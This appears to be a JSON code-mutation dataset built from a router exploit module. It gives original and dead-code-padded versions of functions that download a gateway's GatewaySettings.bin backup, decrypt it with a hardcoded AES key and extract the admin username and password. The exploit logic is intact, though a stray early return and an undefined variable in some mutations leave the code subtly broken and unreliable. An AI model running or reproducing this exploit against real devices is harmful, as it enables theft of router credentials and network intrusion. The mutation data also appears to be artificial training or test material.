[
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n        return None\n        if response is not None and response.status_code == 200:\n            print_status('Reading GatewaySettings.bin...')\n            plain = self.decrypt_backup(response.content)\n            (name, pwd) = self.parse_backup(plain)\n            print_success('Exploit success! login: {}, password: {}'.format(name, pwd))\n        else:\n            print_error('Exploit failed. Could not extract config file.')\n    else:\n        print_error('Target is not vulnerable')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n        return None\n        if response is not None and response.status_code == 200:\n            print_status('Reading GatewaySettings.bin...')\n            plain = self.decrypt_backup(response.content)\n            (name, pwd) = self.parse_backup(plain)\n            print_success('Exploit success! login: {}, password: {}'.format(name, pwd))\n        else:\n            print_error('Exploit failed. Could not extract config file.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n        return None\n        if response is not None and response.status_code == 200:\n            print_status('Reading GatewaySettings.bin...')\n            plain = self.decrypt_backup(response.content)\n            (name, pwd) = self.parse_backup(plain)\n            print_success('Exploit success! login: {}, password: {}'.format(name, pwd))\n        else:\n            print_error('Exploit failed. Could not extract config file.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n        return None\n        if response is not None and response.status_code == 200:\n            print_status('Reading GatewaySettings.bin...')\n            plain = self.decrypt_backup(response.content)\n            (name, pwd) = self.parse_backup(plain)\n            print_success('Exploit success! login: {}, password: {}'.format(name, pwd))\n        else:\n            print_error('Exploit failed. Could not extract config file.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n        return None\n        if response is not None and response.status_code == 200:\n            print_status('Reading GatewaySettings.bin...')\n            plain = self.decrypt_backup(response.content)\n            (name, pwd) = self.parse_backup(plain)\n            print_success('Exploit success! login: {}, password: {}'.format(name, pwd))\n        else:\n            print_error('Exploit failed. Could not extract config file.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n        return None\n        if response is not None and response.status_code == 200:\n            print_status('Reading GatewaySettings.bin...')\n            plain = self.decrypt_backup(response.content)\n            (name, pwd) = self.parse_backup(plain)\n            print_success('Exploit success! login: {}, password: {}'.format(name, pwd))\n        else:\n            print_error('Exploit failed. Could not extract config file.')\n    else:\n        print_error('Target is not vulnerable')"
        ]
    },
    {
        "func_name": "parse_backup",
        "original": "@staticmethod\ndef parse_backup(backup):\n    p = backup.find('MLog')\n    if p > 0:\n        p += 6\n        nh = struct.unpack('!H', backup[p:p + 2])[0]\n        name = backup[p + 2:p + 2 + nh]\n        p += 2 + nh\n        pwd = backup[p + 2:p + 2 + nh]\n        return (name, pwd)\n    return ('', '')",
        "mutated": [
            "@staticmethod\ndef parse_backup(backup):\n    if False:\n        i = 10\n    p = backup.find('MLog')\n    if p > 0:\n        p += 6\n        nh = struct.unpack('!H', backup[p:p + 2])[0]\n        name = backup[p + 2:p + 2 + nh]\n        p += 2 + nh\n        pwd = backup[p + 2:p + 2 + nh]\n        return (name, pwd)\n    return ('', '')",
            "@staticmethod\ndef parse_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    p = backup.find('MLog')\n    if p > 0:\n        p += 6\n        nh = struct.unpack('!H', backup[p:p + 2])[0]\n        name = backup[p + 2:p + 2 + nh]\n        p += 2 + nh\n        pwd = backup[p + 2:p + 2 + nh]\n        return (name, pwd)\n    return ('', '')",
            "@staticmethod\ndef parse_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    p = backup.find('MLog')\n    if p > 0:\n        p += 6\n        nh = struct.unpack('!H', backup[p:p + 2])[0]\n        name = backup[p + 2:p + 2 + nh]\n        p += 2 + nh\n        pwd = backup[p + 2:p + 2 + nh]\n        return (name, pwd)\n    return ('', '')",
            "@staticmethod\ndef parse_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    p = backup.find('MLog')\n    if p > 0:\n        p += 6\n        nh = struct.unpack('!H', backup[p:p + 2])[0]\n        name = backup[p + 2:p + 2 + nh]\n        p += 2 + nh\n        pwd = backup[p + 2:p + 2 + nh]\n        return (name, pwd)\n    return ('', '')",
            "@staticmethod\ndef parse_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    p = backup.find('MLog')\n    if p > 0:\n        p += 6\n        nh = struct.unpack('!H', backup[p:p + 2])[0]\n        name = backup[p + 2:p + 2 + nh]\n        p += 2 + nh\n        pwd = backup[p + 2:p + 2 + nh]\n        return (name, pwd)\n    return ('', '')"
        ]
    },
    {
        "func_name": "decrypt_backup",
        "original": "@staticmethod\ndef decrypt_backup(backup):\n    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')\n    length = len(backup) / 16 * 16\n    cipher = AES.new(key, AES.MODE_ECB)\n    plain = cipher.decrypt(backup[0:length])\n    return plain",
        "mutated": [
            "@staticmethod\ndef decrypt_backup(backup):\n    if False:\n        i = 10\n    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')\n    length = len(backup) / 16 * 16\n    cipher = AES.new(key, AES.MODE_ECB)\n    plain = cipher.decrypt(backup[0:length])\n    return plain",
            "@staticmethod\ndef decrypt_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')\n    length = len(backup) / 16 * 16\n    cipher = AES.new(key, AES.MODE_ECB)\n    plain = cipher.decrypt(backup[0:length])\n    return plain",
            "@staticmethod\ndef decrypt_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')\n    length = len(backup) / 16 * 16\n    cipher = AES.new(key, AES.MODE_ECB)\n    plain = cipher.decrypt(backup[0:length])\n    return plain",
            "@staticmethod\ndef decrypt_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')\n    length = len(backup) / 16 * 16\n    cipher = AES.new(key, AES.MODE_ECB)\n    plain = cipher.decrypt(backup[0:length])\n    return plain",
            "@staticmethod\ndef decrypt_backup(backup):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')\n    length = len(backup) / 16 * 16\n    cipher = AES.new(key, AES.MODE_ECB)\n    plain = cipher.decrypt(backup[0:length])\n    return plain"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n    encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')\n    if response is not None and response.status_code == 200 and (encr_zero_block in response.content):\n        return True\n    return False",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n    encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')\n    if response is not None and response.status_code == 200 and (encr_zero_block in response.content):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n    encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')\n    if response is not None and response.status_code == 200 and (encr_zero_block in response.content):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n    encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')\n    if response is not None and response.status_code == 200 and (encr_zero_block in response.content):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n    encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')\n    if response is not None and response.status_code == 200 and (encr_zero_block in response.content):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    response = self.http_request(method='GET', path='/goform/system/GatewaySettings.bin')\n    encr_zero_block = binascii.unhexlify('F29000B62A499FD0A9F39A6ADD2E7780')\n    if response is not None and response.status_code == 200 and (encr_zero_block in response.content):\n        return True\n    return False"
        ]
    }
]